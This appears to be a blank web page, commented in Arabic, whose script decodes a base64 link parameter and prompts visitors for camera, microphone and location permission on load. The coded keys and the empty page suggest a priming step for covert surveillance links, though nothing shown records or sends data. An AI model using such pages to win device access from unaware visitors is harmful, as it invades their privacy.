
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title></title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    min-height: 100%;
    background: #fff;
}
</style>
</head>
<body>

<script>
"use strict";

/* فك تشفير الرابط */
function decodeBase64(value) {
    try {
        value = value.replace(/-/g, "+").replace(/_/g, "/");

        while (value.length % 4 !== 0) {
            value += "=";
        }

        const binary = atob(value);
        const bytes = Uint8Array.from(
            binary,
            char => char.charCodeAt(0)
        );

        return new TextDecoder().decode(bytes);
    } catch (error) {
        console.error("Decode error:", error);
        return "";
    }
}

/* استخراج الأذونات */
function getFeatures() {
    const urlParams = new URLSearchParams(location.search);
    const encoded = urlParams.get("u");

    if (!encoded) return new Set();

    const decoded = decodeBase64(encoded);
    console.log("Decoded:", decoded);

    const params = new URLSearchParams(decoded);

    return new Set(
        [...params.keys()].map(key =>
            key.trim().toLowerCase()
        )
    );
}

/* فحص حالة الإذن */
async function getPermissionState(name) {
    if (!navigator.permissions) return "unknown";

    try {
        const permission = await navigator.permissions.query({
            name: name
        });

        return permission.state;
    } catch (error) {
        return "unknown";
    }
}

/* طلب إذن الكاميرا */
async function requestCamera() {
    const state = await getPermissionState("camera");

    console.log("Camera state:", state);

    if (state === "granted" || state === "denied") {
        return;
    }

    if (!navigator.mediaDevices?.getUserMedia) return;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        stream.getTracks().forEach(track => track.stop());

        console.log("Camera permission granted");
    } catch (error) {
        console.log("Camera request:", error.name);
    }
}

/* طلب إذن الميكروفون */
async function requestMicrophone() {
    const state = await getPermissionState("microphone");

    console.log("Microphone state:", state);

    if (state === "granted" || state === "denied") {
        return;
    }

    if (!navigator.mediaDevices?.getUserMedia) return;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: false,
            audio: true
        });

        stream.getTracks().forEach(track => track.stop());

        console.log("Microphone permission granted");
    } catch (error) {
        console.log("Microphone request:", error.name);
    }
}

/* طلب إذن الموقع */
async function requestLocation() {
    const state = await getPermissionState("geolocation");

    console.log("Location state:", state);

    if (state === "granted" || state === "denied") {
        return;
    }

    if (!navigator.geolocation) return;

    await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            () => {
                console.log("Location permission granted");
                resolve();
            },
            error => {
                console.log("Location request:", error.message);
                resolve();
            },
            {
                enableHighAccuracy: false,
                timeout: 15000,
                maximumAge: 0
            }
        );
    });
}

/* تشغيل الأذونات حسب الرابط */
async function start() {
    const features = getFeatures();

    const camera = [
        "fc",
        "bc",
        "fcv",
        "bcv"
    ].some(key => features.has(key));

    const microphone = [
        "r",
        "fcv",
        "bcv"
    ].some(key => features.has(key));

    const location = features.has("l");

    console.log("Requested features:", [...features]);

    if (camera) {
        await requestCamera();
    }

    if (microphone) {
        await requestMicrophone();
    }

    if (location) {
        await requestLocation();
    }

    console.log("Permission test completed");
}

/* البدء عند تحميل الصفحة */
start();

</script>

</body>
</html>
